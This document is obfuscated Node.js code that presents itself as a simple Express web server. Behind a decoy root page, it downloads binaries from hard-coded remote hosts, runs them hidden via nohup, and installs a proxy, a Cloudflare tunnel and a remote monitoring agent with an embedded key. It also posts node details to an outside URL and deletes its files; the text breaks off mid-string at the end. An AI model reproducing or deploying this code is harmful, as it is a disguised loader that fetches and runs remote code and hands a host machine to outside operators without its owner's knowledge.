const _0x1f2ec0=_0x3a55;(function(_0x5509f6,_0x5a6dfb){const _0x4449e8={_0x233b46:0xb1,_0x41fe99:0xad,_0x243729:0xa3,_0x52f335:0x8a,_0x256557:0x9f},_0x416f6a=_0x3a55,_0x19d40c=_0x5509f6();while(!![]){try{const _0x19c9fa=parseInt(_0x416f6a(0x140))/0x1+-parseInt(_0x416f6a(_0x4449e8._0x233b46))/0x2+parseInt(_0x416f6a(0x119))/0x3+parseInt(_0x416f6a(_0x4449e8._0x41fe99))/0x4*(parseInt(_0x416f6a(0xe0))/0x5)+parseInt(_0x416f6a(0x138))/0x6+parseInt(_0x416f6a(_0x4449e8._0x243729))/0x7*(-parseInt(_0x416f6a(0xef))/0x8)+parseInt(_0x416f6a(_0x4449e8._0x52f335))/0x9*(-parseInt(_0x416f6a(_0x4449e8._0x256557))/0xa);if(_0x19c9fa===_0x5a6dfb)break;else _0x19d40c['push'](_0x19d40c['shift']());}catch(_0x53e4ce){_0x19d40c['push'](_0x19d40c['shift']());}}}(_0x42e6,0xa11e0));const express=require(_0x1f2ec0(0xfd)),app=express(),axios=require(_0x1f2ec0(0x9c)),os=require('os'),fs=require('fs'),path=require(_0x1f2ec0(0xdd)),{promisify}=require(_0x1f2ec0(0xa4)),exec=promisify(require('child_process')[_0x1f2ec0(0xc5)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x1f2ec0(0xed)][_0x1f2ec0(0x105)]||'',PROJECT_URL=process[_0x1f2ec0(0xed)][_0x1f2ec0(0xe2)]||'',AUTO_ACCESS=process[_0x1f2ec0(0xed)]['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||'./tmp',SUB_PATH=process['env'][_0x1f2ec0(0x13e)]||_0x1f2ec0(0x106),PORT=process['env']['SERVER_PORT']||process[_0x1f2ec0(0xed)][_0x1f2ec0(0xfc)]||0xbb8,UUID=process[_0x1f2ec0(0xed)][_0x1f2ec0(0xcd)]||_0x1f2ec0(0x98),NEZHA_SERVER=process[_0x1f2ec0(0xed)][_0x1f2ec0(0xda)]||_0x1f2ec0(0xf4),NEZHA_PORT=process[_0x1f2ec0(0xed)][_0x1f2ec0(0x8c)]||'',NEZHA_KEY=process[_0x1f2ec0(0xed)][_0x1f2ec0(0x12e)]||'KEHwOgVpWZuJtrGF1W7snggUcKgc4RYf',ARGO_DOMAIN=process[_0x1f2ec0(0xed)][_0x1f2ec0(0x146)]||_0x1f2ec0(0x11c),ARGO_AUTH=process[_0x1f2ec0(0xed)][_0x1f2ec0(0xbb)]||_0x1f2ec0(0xc2),ARGO_PORT=process[_0x1f2ec0(0xed)][_0x1f2ec0(0x137)]||0x1f41,CFIP=process['env'][_0x1f2ec0(0x91)]||'www.columbia.edu',CFPORT=process['env'][_0x1f2ec0(0x107)]||0x50,NAME=process['env'][_0x1f2ec0(0xd9)]||_0x1f2ec0(0xd6);!fs[_0x1f2ec0(0x115)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x1f2ec0(0x92)](FILE_PATH+_0x1f2ec0(0xd1))):console['log'](FILE_PATH+_0x1f2ec0(0xb3));function generateRandomName(){const _0x2eb1f2={_0x51051d:0xbd},_0x47cb97=_0x1f2ec0,_0x563b3b=_0x47cb97(0xdc);let _0x18fad9='';for(let _0x54d679=0x0;_0x54d679<0x6;_0x54d679++){_0x18fad9+=_0x563b3b[_0x47cb97(_0x2eb1f2._0x51051d)](Math[_0x47cb97(0x95)](Math[_0x47cb97(0xae)]()*_0x563b3b[_0x47cb97(0xe7)]));}return _0x18fad9;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1f2ec0(0x96)](FILE_PATH,npmName),phpPath=path[_0x1f2ec0(0x96)](FILE_PATH,phpName),webPath=path[_0x1f2ec0(0x96)](FILE_PATH,webName),botPath=path[_0x1f2ec0(0x96)](FILE_PATH,botName),subPath=path[_0x1f2ec0(0x96)](FILE_PATH,_0x1f2ec0(0x143)),listPath=path[_0x1f2ec0(0x96)](FILE_PATH,_0x1f2ec0(0x12d)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x1f2ec0(0x96)](FILE_PATH,_0x1f2ec0(0x9d));function deleteNodes(){const _0x2c2390={_0x2b8819:0x115,_0x4d3809:0xba,_0x430dde:0xdb,_0x43a384:0xa0},_0x2e22b8=_0x1f2ec0;try{if(!UPLOAD_URL)return;if(!fs[_0x2e22b8(_0x2c2390._0x2b8819)](subPath))return;let _0x1d686c;try{_0x1d686c=fs[_0x2e22b8(0xec)](subPath,_0x2e22b8(0xd7));}catch{return null;}const _0x58be33=Buffer[_0x2e22b8(_0x2c2390._0x4d3809)](_0x1d686c,_0x2e22b8(0xc3))['toString'](_0x2e22b8(0xd7)),_0x2ce053=_0x58be33[_0x2e22b8(0xea)]('\x0a')[_0x2e22b8(0xa9)](_0x320815=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x320815));if(_0x2ce053[_0x2e22b8(0xe7)]===0x0)return;return axios[_0x2e22b8(_0x2c2390._0x430dde)](UPLOAD_URL+_0x2e22b8(_0x2c2390._0x43a384),JSON['stringify']({'nodes':_0x2ce053}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x32c129=>{return null;}),null;}catch(_0x2e354d){return null;}}function cleanupOldFiles(){const _0x580d1f=_0x1f2ec0;try{const _0x1355ae=fs[_0x580d1f(0xbf)](FILE_PATH);_0x1355ae[_0x580d1f(0x8f)](_0x5d2255=>{const _0x178dd1=_0x580d1f,_0x175bc9=path['join'](FILE_PATH,_0x5d2255);try{const _0x29fe5b=fs[_0x178dd1(0x8e)](_0x175bc9);_0x29fe5b['isFile']()&&fs['unlinkSync'](_0x175bc9);}catch(_0x336474){}});}catch(_0x5f2c4b){}}app[_0x1f2ec0(0x12c)]('/',function(_0x58e1be,_0x492faf){const _0x3e71db={_0x31909a:0x116},_0x228199=_0x1f2ec0;_0x492faf[_0x228199(_0x3e71db._0x31909a)](_0x228199(0x127));});async function generateConfig(){const _0x28302={_0x4798c8:0x10a,_0x4d9e23:0x125,_0x55e41e:0x139,_0x29e8d6:0x10a,_0x59a737:0xc6,_0x1137ae:0x89,_0x2d29c3:0x147,_0x1e4496:0xe6,_0x14e001:0xf0,_0x19d4db:0xd0,_0x2e4426:0x93,_0x4c5c0e:0x109},_0x223c4f=_0x1f2ec0,_0x7efafc={'log':{'access':'/dev/null','error':_0x223c4f(0x104),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x223c4f(_0x28302._0x4798c8),'settings':{'clients':[{'id':UUID,'flow':_0x223c4f(_0x28302._0x4d9e23)}],'decryption':_0x223c4f(0xe6),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x223c4f(0x99),'dest':0xbbb},{'path':_0x223c4f(_0x28302._0x55e41e),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x223c4f(_0x28302._0x29e8d6),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x223c4f(0x133),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x223c4f(0xe6)},'streamSettings':{'network':'ws','security':_0x223c4f(0xe6),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x223c4f(0x147),_0x223c4f(_0x28302._0x59a737),_0x223c4f(_0x28302._0x1137ae)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x223c4f(0x133),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x223c4f(_0x28302._0x2d29c3),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x223c4f(0x133),'protocol':_0x223c4f(0xa1),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x223c4f(_0x28302._0x1e4496),'wsSettings':{'path':_0x223c4f(0x139)}},'sniffing':{'enabled':!![],'destOverride':[_0x223c4f(0x147),_0x223c4f(_0x28302._0x59a737),_0x223c4f(_0x28302._0x1137ae)],'metadataOnly':![]}}],'dns':{'servers':[_0x223c4f(_0x28302._0x14e001)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x223c4f(_0x28302._0x19d4db),'tag':_0x223c4f(_0x28302._0x2e4426)}]};fs[_0x223c4f(_0x28302._0x4c5c0e)](path['join'](FILE_PATH,_0x223c4f(0x9d)),JSON['stringify'](_0x7efafc,null,0x2));}function getSystemArchitecture(){const _0x28d544={_0x318377:0x131},_0x4b8c5d=_0x1f2ec0,_0x50dd6c=os[_0x4b8c5d(0xee)]();return _0x50dd6c===_0x4b8c5d(_0x28d544._0x318377)||_0x50dd6c==='arm64'||_0x50dd6c==='aarch64'?_0x4b8c5d(0x131):'amd';}function downloadFile(_0x5e1ec7,_0x1a63c5,_0x307fef){const _0x473cae={_0x5bb468:0x115,_0x4d7964:0xe8,_0x21f1e3:0xa5},_0x4a504a={_0x3af50e:0xde,_0x1a0d57:0x101},_0x597bb5={_0x2b3323:0x122,_0x59bd09:0x101},_0x45b436={_0x1b8a0a:0x92,_0x416ea4:0x118},_0x66a639=_0x1f2ec0,_0x4edeb7=_0x5e1ec7;!fs[_0x66a639(_0x473cae._0x5bb468)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x248e34=fs[_0x66a639(_0x473cae._0x4d7964)](_0x4edeb7);axios({'method':_0x66a639(0x12c),'url':_0x1a63c5,'responseType':_0x66a639(_0x473cae._0x21f1e3)})['then'](_0x42bcb2=>{const _0x17f50a=_0x66a639;_0x42bcb2[_0x17f50a(0x13b)]['pipe'](_0x248e34),_0x248e34['on']('finish',()=>{const _0x16a96d=_0x17f50a;_0x248e34['close'](),console[_0x16a96d(_0x45b436._0x1b8a0a)](_0x16a96d(_0x45b436._0x416ea4)+path[_0x16a96d(0xde)](_0x4edeb7)+'\x20successfully'),_0x307fef(null,_0x4edeb7);}),_0x248e34['on'](_0x17f50a(0x101),_0x1894c3=>{const _0x241e33=_0x17f50a;fs[_0x241e33(_0x597bb5._0x2b3323)](_0x4edeb7,()=>{});const _0x207bb0=_0x241e33(0x118)+path['basename'](_0x4edeb7)+'\x20failed:\x20'+_0x1894c3['message'];console[_0x241e33(_0x597bb5._0x59bd09)](_0x207bb0),_0x307fef(_0x207bb0);});})[_0x66a639(0x11b)](_0x416161=>{const _0x26a170=_0x66a639,_0x286af6=_0x26a170(0x118)+path[_0x26a170(_0x4a504a._0x3af50e)](_0x4edeb7)+_0x26a170(0xcf)+_0x416161['message'];console[_0x26a170(_0x4a504a._0x1a0d57)](_0x286af6),_0x307fef(_0x286af6);});}async function downloadFilesAndRun(){const _0x38461f={_0x148d06:0xe7,_0x30a0ea:0xc4,_0x232b67:0x126,_0x4bb557:0xb5,_0x4f354e:0xff,_0x1c5796:0x100,_0x1d6229:0x109,_0x47b29d:0x96,_0x68d5e4:0x102,_0xd59840:0x92,_0x5c3ea0:0xb4,_0x188cca:0x111,_0x24ac00:0xe5,_0x3064b7:0xc7,_0x2a51f9:0xeb,_0x3b587e:0xd3,_0x244f45:0x101,_0x57f4e8:0x115,_0x5b3f05:0x112,_0x1714eb:0xaa,_0x2fdd1d:0xfb,_0x2858c2:0xc8,_0x5a084c:0xe1,_0x3b3044:0x101},_0x330c34=_0x1f2ec0,_0x5e5530=getSystemArchitecture(),_0x30d1d3=getFilesForArchitecture(_0x5e5530);if(_0x30d1d3[_0x330c34(_0x38461f._0x148d06)]===0x0){console[_0x330c34(0x92)](_0x330c34(_0x38461f._0x30a0ea));return;}const _0x2fc97a=_0x30d1d3['map'](_0x1e678f=>{return new Promise((_0x799ad6,_0x45f19f)=>{const _0x2b2eca=_0x3a55;downloadFile(_0x1e678f[_0x2b2eca(0x11f)],_0x1e678f[_0x2b2eca(0xb9)],(_0x264894,_0x23ee15)=>{_0x264894?_0x45f19f(_0x264894):_0x799ad6(_0x23ee15);});});});try{await Promise[_0x330c34(0x12a)](_0x2fc97a);}catch(_0x2463c1){console['error'](_0x330c34(0x108),_0x2463c1);return;}function _0x12bb79(_0x16b4a3){const _0x435462={_0x377e7e:0x115,_0x5b8a73:0x142},_0x709643=0x1fd;_0x16b4a3['forEach'](_0x430732=>{const _0x54b270={_0x13f3e8:0x101,_0x18b869:0xce,_0x557f4a:0x92},_0x40c500=_0x3a55;fs[_0x40c500(_0x435462._0x377e7e)](_0x430732)&&fs[_0x40c500(_0x435462._0x5b8a73)](_0x430732,_0x709643,_0x4f9c14=>{const _0x433844=_0x40c500;_0x4f9c14?console[_0x433844(_0x54b270._0x13f3e8)](_0x433844(_0x54b270._0x18b869)+_0x430732+':\x20'+_0x4f9c14):console[_0x433844(_0x54b270._0x557f4a)](_0x433844(0xe4)+_0x430732+':\x20'+_0x709643[_0x433844(0x128)](0x8));});});}const _0x2143b6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x12bb79(_0x2143b6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x85851d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x330c34(0xea)](':')['pop']():'',_0x11a31b=new Set([_0x330c34(0xb4),'8443','2096',_0x330c34(_0x38461f._0x232b67),_0x330c34(_0x38461f._0x4bb557),_0x330c34(_0x38461f._0x4f354e)]),_0x259087=_0x11a31b[_0x330c34(0x113)](_0x85851d)?'true':_0x330c34(0xd4),_0x2b878c=_0x330c34(0xa7)+NEZHA_KEY+_0x330c34(0xbc)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x259087+_0x330c34(_0x38461f._0x1c5796)+UUID;fs[_0x330c34(_0x38461f._0x1d6229)](path[_0x330c34(_0x38461f._0x47b29d)](FILE_PATH,'config.yaml'),_0x2b878c);const _0x52abfa=_0x330c34(_0x38461f._0x68d5e4)+phpPath+_0x330c34(0xdf)+FILE_PATH+_0x330c34(0xc0);try{await exec(_0x52abfa),console[_0x330c34(_0x38461f._0xd59840)](phpName+'\x20is\x20running'),await new Promise(_0xb1fbdc=>setTimeout(_0xb1fbdc,0x3e8));}catch(_0x2929fb){console[_0x330c34(0x101)](_0x330c34(0x117)+_0x2929fb);}}else{let _0x181703='';const _0x216301=[_0x330c34(_0x38461f._0x5c3ea0),'8443',_0x330c34(_0x38461f._0x188cca),_0x330c34(0x126),_0x330c34(0xb5),'2053'];_0x216301[_0x330c34(_0x38461f._0x24ac00)](NEZHA_PORT)&&(_0x181703=_0x330c34(0xab));const _0x58266c=_0x330c34(_0x38461f._0x68d5e4)+npmPath+_0x330c34(_0x38461f._0x3064b7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x330c34(0xcc)+NEZHA_KEY+'\x20'+_0x181703+_0x330c34(_0x38461f._0x2a51f9);try{await exec(_0x58266c),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x214438=>setTimeout(_0x214438,0x3e8));}catch(_0x51936b){console['error'](_0x330c34(0xc1)+_0x51936b);}}}else console['log'](_0x330c34(_0x38461f._0x3b587e));const _0x44a190=_0x330c34(_0x38461f._0x68d5e4)+webPath+_0x330c34(0x11a)+FILE_PATH+_0x330c34(0x86);try{await exec(_0x44a190),console[_0x330c34(0x92)](webName+'\x20is\x20running'),await new Promise(_0x4a5e9c=>setTimeout(_0x4a5e9c,0x3e8));}catch(_0x4fc70b){console[_0x330c34(_0x38461f._0x244f45)](_0x330c34(0xf9)+_0x4fc70b);}if(fs[_0x330c34(_0x38461f._0x57f4e8)](botPath)){let _0x54e100;if(ARGO_AUTH[_0x330c34(_0x38461f._0x5b3f05)](/^[A-Z0-9a-z=]{120,250}$/))_0x54e100='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x54e100=_0x330c34(_0x38461f._0x1714eb)+FILE_PATH+_0x330c34(_0x38461f._0x2fdd1d):_0x54e100=_0x330c34(0x134)+FILE_PATH+_0x330c34(_0x38461f._0x2858c2)+ARGO_PORT;try{await exec(_0x330c34(0x102)+botPath+'\x20'+_0x54e100+'\x20>/dev/null\x202>&1\x20&'),console[_0x330c34(_0x38461f._0xd59840)](botName+_0x330c34(_0x38461f._0x5a084c)),await new Promise(_0x202a13=>setTimeout(_0x202a13,0x7d0));}catch(_0xe1610e){console[_0x330c34(_0x38461f._0x3b3044)]('Error\x20executing\x20command:\x20'+_0xe1610e);}}await new Promise(_0x53b3db=>setTimeout(_0x53b3db,0x1388));}function getFilesForArchitecture(_0x4f8b46){const _0x2a0e8d={_0x4b0a9a:0x131,_0x5852c1:0x10c,_0x5c825f:0x148,_0x52ac31:0x120},_0x2e0fd1=_0x1f2ec0;let _0x3e29c4;_0x4f8b46===_0x2e0fd1(_0x2a0e8d._0x4b0a9a)?_0x3e29c4=[{'fileName':webPath,'fileUrl':_0x2e0fd1(0xbe)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x3e29c4=[{'fileName':webPath,'fileUrl':_0x2e0fd1(0xb8)},{'fileName':botPath,'fileUrl':_0x2e0fd1(_0x2a0e8d._0x5852c1)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5b7e61=_0x4f8b46==='arm'?_0x2e0fd1(_0x2a0e8d._0x5c825f):'https://amd64.ssss.nyc.mn/agent';_0x3e29c4[_0x2e0fd1(0x94)]({'fileName':npmPath,'fileUrl':_0x5b7e61});}else{const _0x5d7f93=_0x4f8b46===_0x2e0fd1(_0x2a0e8d._0x4b0a9a)?_0x2e0fd1(0xe3):_0x2e0fd1(_0x2a0e8d._0x52ac31);_0x3e29c4[_0x2e0fd1(0x94)]({'fileName':phpPath,'fileUrl':_0x5d7f93});}}return _0x3e29c4;}function argoType(){const _0xf229c3={_0x3329c3:0x92,_0x1ff34f:0x9e,_0x390aca:0x145,_0x55c720:0x96,_0x4e9252:0x124,_0x118d10:0xd2,_0x2a0c6a:0x109,_0x250832:0x114},_0x2b7375=_0x1f2ec0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2b7375(_0xf229c3._0x3329c3)](_0x2b7375(_0xf229c3._0x1ff34f));return;}if(ARGO_AUTH['includes'](_0x2b7375(_0xf229c3._0x390aca))){fs['writeFileSync'](path[_0x2b7375(_0xf229c3._0x55c720)](FILE_PATH,_0x2b7375(_0xf229c3._0x4e9252)),ARGO_AUTH);const _0x42b9ae='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x2b7375(0xea)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x2b7375(_0xf229c3._0x55c720)](FILE_PATH,_0x2b7375(0x124))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x2b7375(_0xf229c3._0x118d10)+ARGO_PORT+_0x2b7375(0x88);fs[_0x2b7375(_0xf229c3._0x2a0c6a)](path[_0x2b7375(0x96)](FILE_PATH,'tunnel.yml'),_0x42b9ae);}else console[_0x2b7375(0x92)](_0x2b7375(_0xf229c3._0x250832));}async function extractDomains(){const _0x2d018d={_0x36aafe:0x13a,_0x12d18a:0xd7,_0x2fb40c:0xea,_0x1f79ff:0x92,_0x708dfb:0xa8,_0x515e16:0x96,_0x47d5f0:0x134,_0x15c9c1:0x102,_0x25d071:0xf5,_0x25f763:0xfe},_0x28740b={_0x1dc9a6:0x12c,_0x5ec13b:0x13b,_0xc51702:0xaf,_0x4ae7db:0x10f,_0x909f4d:0x132,_0xb40d89:0x13b,_0x30261a:0x110},_0xb58d89={_0x5d0380:0xbd},_0x2a449d={_0x1ecf73:0x112},_0x1432c8=_0x1f2ec0;let _0x5f2058;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5f2058=ARGO_DOMAIN,console[_0x1432c8(0x92)](_0x1432c8(0xfa),_0x5f2058),await _0x1d9cfe(_0x5f2058);else try{const _0x438f16=fs['readFileSync'](path[_0x1432c8(0x96)](FILE_PATH,_0x1432c8(_0x2d018d._0x36aafe)),_0x1432c8(_0x2d018d._0x12d18a)),_0x53d9ba=_0x438f16[_0x1432c8(_0x2d018d._0x2fb40c)]('\x0a'),_0x131bea=[];_0x53d9ba[_0x1432c8(0x8f)](_0x3cacf1=>{const _0x32e770=_0x1432c8,_0x59c17b=_0x3cacf1[_0x32e770(_0x2a449d._0x1ecf73)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x59c17b){const _0x35bd0c=_0x59c17b[0x1];_0x131bea[_0x32e770(0x10b)](_0x35bd0c);}});if(_0x131bea[_0x1432c8(0xe7)]>0x0)_0x5f2058=_0x131bea[0x0],console[_0x1432c8(0x92)](_0x1432c8(0x12f),_0x5f2058),await _0x1d9cfe(_0x5f2058);else{console[_0x1432c8(_0x2d018d._0x1f79ff)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x1432c8(_0x2d018d._0x708dfb)](path[_0x1432c8(_0x2d018d._0x515e16)](FILE_PATH,'boot.log'));async function _0x4a8064(){const _0x19f03f=_0x1432c8;try{process[_0x19f03f(0x13c)]==='win32'?await exec(_0x19f03f(0x8d)+botName+_0x19f03f(0xf6)):await exec(_0x19f03f(0x141)+botName[_0x19f03f(_0xb58d89._0x5d0380)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x10d341){}}_0x4a8064(),await new Promise(_0x3e7ef7=>setTimeout(_0x3e7ef7,0xbb8));const _0x2b08cb=_0x1432c8(_0x2d018d._0x47d5f0)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1432c8(_0x2d018d._0x15c9c1)+botPath+'\x20'+_0x2b08cb+_0x1432c8(0xb2)),console[_0x1432c8(_0x2d018d._0x1f79ff)](botName+_0x1432c8(0xe1)),await new Promise(_0x3310bd=>setTimeout(_0x3310bd,0xbb8)),await extractDomains();}catch(_0x448d2e){console[_0x1432c8(0x101)](_0x1432c8(_0x2d018d._0x25d071)+_0x448d2e);}}}catch(_0x54a3b6){console[_0x1432c8(0x101)](_0x1432c8(_0x2d018d._0x25f763),_0x54a3b6);}async function _0x3bfb59(){const _0x32d0db=_0x1432c8;try{const _0x3389e2=await axios[_0x32d0db(_0x28740b._0x1dc9a6)](_0x32d0db(0x8b),{'timeout':0xbb8});if(_0x3389e2[_0x32d0db(_0x28740b._0x5ec13b)]&&_0x3389e2[_0x32d0db(0x13b)][_0x32d0db(0x121)]&&_0x3389e2[_0x32d0db(0x13b)]['org'])return _0x3389e2[_0x32d0db(0x13b)][_0x32d0db(0x121)]+'_'+_0x3389e2[_0x32d0db(_0x28740b._0x5ec13b)]['org'];}catch(_0x2f0de0){try{const _0x4f7931=await axios[_0x32d0db(0x12c)](_0x32d0db(0x11e),{'timeout':0xbb8});if(_0x4f7931[_0x32d0db(0x13b)]&&_0x4f7931[_0x32d0db(_0x28740b._0x5ec13b)][_0x32d0db(_0x28740b._0xc51702)]===_0x32d0db(_0x28740b._0x4ae7db)&&_0x4f7931['data'][_0x32d0db(_0x28740b._0x909f4d)]&&_0x4f7931['data']['org'])return _0x4f7931[_0x32d0db(0x13b)][_0x32d0db(0x132)]+'_'+_0x4f7931[_0x32d0db(_0x28740b._0xb40d89)]['org'];}catch(_0x571697){}}return _0x32d0db(_0x28740b._0x30261a);}async function _0x1d9cfe(_0x5614b7){const _0x4c18e7=await _0x3bfb59(),_0x56dbf3=NAME?NAME+'-'+_0x4c18e7:_0x4c18e7;return new Promise(_0x498da9=>{const _0x8c24ee={_0x4cf4ac:0xe6,_0x3de640:0xb0,_0x52496b:0xc6,_0x8eeb7f:0xb6,_0x4b1b22:0x90,_0x2e9be1:0x13f,_0x4efc0f:0xba,_0x17911d:0x87,_0x5a8c61:0xc3,_0x483f88:0x144,_0x19b38a:0x109,_0x494d03:0x128,_0x3b3460:0x12c};setTimeout(()=>{const _0x80ec28=_0x3a55,_0x13a5ab={'v':'2','ps':''+_0x56dbf3,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x80ec28(_0x8c24ee._0x4cf4ac),'host':_0x5614b7,'path':_0x80ec28(_0x8c24ee._0x3de640),'tls':_0x80ec28(_0x8c24ee._0x52496b),'sni':_0x5614b7,'alpn':'','fp':_0x80ec28(_0x8c24ee._0x8eeb7f)},_0xeb8de=_0x80ec28(_0x8c24ee._0x4b1b22)+UUID+'@'+CFIP+':'+CFPORT+_0x80ec28(0xd5)+_0x5614b7+_0x80ec28(0x12b)+_0x5614b7+_0x80ec28(_0x8c24ee._0x2e9be1)+_0x56dbf3+_0x80ec28(0x13d)+Buffer[_0x80ec28(_0x8c24ee._0x4efc0f)](JSON[_0x80ec28(_0x8c24ee._0x17911d)](_0x13a5ab))['toString'](_0x80ec28(_0x8c24ee._0x5a8c61))+_0x80ec28(0xf1)+UUID+'@'+CFIP+':'+CFPORT+_0x80ec28(_0x8c24ee._0x483f88)+_0x5614b7+'&fp=firefox&type=ws&host='+_0x5614b7+_0x80ec28(0xf7)+_0x56dbf3+_0x80ec28(0xe9);console['log'](Buffer[_0x80ec28(_0x8c24ee._0x4efc0f)](_0xeb8de)[_0x80ec28(0x128)](_0x80ec28(0xc3))),fs[_0x80ec28(_0x8c24ee._0x19b38a)](subPath,Buffer['from'](_0xeb8de)[_0x80ec28(_0x8c24ee._0x494d03)](_0x80ec28(0xc3))),console[_0x80ec28(0x92)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x80ec28(_0x8c24ee._0x3b3460)]('/'+SUB_PATH,(_0x587a20,_0x1f92cb)=>{const _0x34779d=_0x80ec28,_0x41d329=Buffer[_0x34779d(0xba)](_0xeb8de)[_0x34779d(0x128)](_0x34779d(0xc3));_0x1f92cb[_0x34779d(0xd8)](_0x34779d(0x10d),'text/plain;\x20charset=utf-8'),_0x1f92cb['send'](_0x41d329);}),_0x498da9(_0xeb8de);},0x7d0);});}}async function uploadNodes(){const _0x3ee2b1={_0x51885b:0xca,_0xaf2437:0x9b,_0x6be8fc:0x92,_0x1f41da:0xb7,_0x38c283:0xec,_0x298d6a:0xe7,_0x25b6c9:0x130,_0x547792:0xaf},_0x45100f=_0x1f2ec0;if(UPLOAD_URL&&PROJECT_URL){const _0x2282a5=PROJECT_URL+'/'+SUB_PATH,_0x149c18={'subscription':[_0x2282a5]};try{const _0x34e747=await axios['post'](UPLOAD_URL+_0x45100f(_0x3ee2b1._0x51885b),_0x149c18,{'headers':{'Content-Type':_0x45100f(_0x3ee2b1._0xaf2437)}});return _0x34e747&&_0x34e747[_0x45100f(0xaf)]===0xc8?(console[_0x45100f(_0x3ee2b1._0x6be8fc)](_0x45100f(_0x3ee2b1._0x1f41da)),_0x34e747):null;}catch(_0x2967de){if(_0x2967de[_0x45100f(0xf3)]){if(_0x2967de['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x45100f(0x115)](listPath))return;const _0xc10c39=fs[_0x45100f(_0x3ee2b1._0x38c283)](listPath,'utf-8'),_0x2b19c9=_0xc10c39['split']('\x0a')['filter'](_0x3ffc27=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x45100f(0x136)](_0x3ffc27));if(_0x2b19c9[_0x45100f(_0x3ee2b1._0x298d6a)]===0x0)return;const _0x2c6183=JSON['stringify']({'nodes':_0x2b19c9});try{const _0x2f1dc1=await axios[_0x45100f(0xdb)](UPLOAD_URL+_0x45100f(_0x3ee2b1._0x25b6c9),_0x2c6183,{'headers':{'Content-Type':_0x45100f(0x9b)}});return _0x2f1dc1&&_0x2f1dc1[_0x45100f(_0x3ee2b1._0x547792)]===0xc8?(console['log'](_0x45100f(0x103)),_0x2f1dc1):null;}catch(_0x587251){return null;}}else return;}}function _0x42e6(){const _0x384e7f=['\x20is\x20created','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','NEZHA\x20variable\x20is\x20empty,skip\x20running','false','?encryption=none&security=tls&sni=','HK_leaflow','utf-8','set','NAME','NEZHA_SERVER','post','abcdefghijklmnopqrstuvwxyz','path','basename','\x20-c\x20\x22','15codzLl','\x20is\x20running','PROJECT_URL','https://arm64.ssss.nyc.mn/v1','Empowerment\x20success\x20for\x20','includes','none','length','createWriteStream','\x0a\x20\x20\x20\x20','split','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','readFileSync','env','arch','32zQWOWC','https+local://8.8.8.8/dns-query','\x0a\x0atrojan://','rm\x20-rf\x20','response','nezha.vccv.nyc.mn:8008','Error\x20executing\x20command:\x20','.exe\x20>\x20nul\x202>&1','&path=%2Ftrojan-argo%3Fed%3D2560#','Unhandled\x20error\x20in\x20startserver:','web\x20running\x20error:\x20','ARGO_DOMAIN:','/tunnel.yml\x20run','PORT','express','Error\x20reading\x20boot.log:','2053','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','error','nohup\x20','Nodes\x20uploaded\x20successfully','/dev/null','UPLOAD_URL','sub','CFPORT','Error\x20downloading\x20files:','writeFileSync','vless','push','https://amd64.ssss.nyc.mn/bot','Content-Type','Thank\x20you\x20